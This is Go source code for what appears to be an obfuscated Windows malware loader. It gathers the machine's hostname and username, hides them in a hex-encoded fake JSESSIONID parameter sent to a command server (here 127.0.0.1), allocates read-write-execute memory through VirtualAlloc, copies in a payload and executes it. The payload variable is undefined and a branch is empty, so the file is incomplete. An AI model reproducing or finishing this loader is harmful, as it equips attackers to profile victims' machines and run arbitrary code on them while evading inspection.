package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"syscall"
	"unsafe"
)

const (
	ImLoXsgyZHyI = 0x1000
	egxsUNd      = 0x2000
	wOgdemlqWBGV = 0x40
)

var (
	WWkBCl = syscall.NewLazyDLL("kernel32.dll")
	vnEYvT = WWkBCl.NewProc("VirtualAlloc")
)

func ueKHhjz(riZzjxfWFmxj uintptr) (uintptr, error) {
	kMojJzioOMRujW, _, dNeEZFofBrnbj := vnEYvT.Call(0, riZzjxfWFmxj, egxsUNd|ImLoXsgyZHyI, wOgdemlqWBGV)
	if kMojJzioOMRujW == 0 {
		return 0, dNeEZFofBrnbj
	}
	return kMojJzioOMRujW, nil
}

func main() {
	hostname, _ := os.Hostname()
	usr, _ := user.Current()
	username := usr.Username
	ciphertext := []byte(hostname + "\xff" + username)
	payload := []byte{0x00, 0x00}
	payload = append(payload, ciphertext...)
	resp, err := http.Get("http://127.0.0.1/?JSESSIONID=" + hex.EncodeToString(payload))
	if err != nil {
		panic(err)
	}
	if resp.StatusCode != 200 {
		fmt.Println(resp.StatusCode)
		os.Exit(0)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	ciphertext, _ = hex.DecodeString(string(body))
	plain := ciphertext

	switch plain[0] {
	case 0x00:

	}

	kMojJzioOMRujW, dNeEZFofBrnbj := ueKHhjz(uintptr(len(fnGyjIAgSFTIq)))
	if dNeEZFofBrnbj != nil {
		fmt.Println(dNeEZFofBrnbj)
		os.Exit(1)
	}
	ufirXzjJzKNkMJW := (*[890000]byte)(unsafe.Pointer(kMojJzioOMRujW))
	for x, ruhMhpnDGaV := range []byte(fnGyjIAgSFTIq) {
		ufirXzjJzKNkMJW[x] = ruhMhpnDGaV
	}
	syscall.Syscall(kMojJzioOMRujW, 0, 0, 0, 0)
}
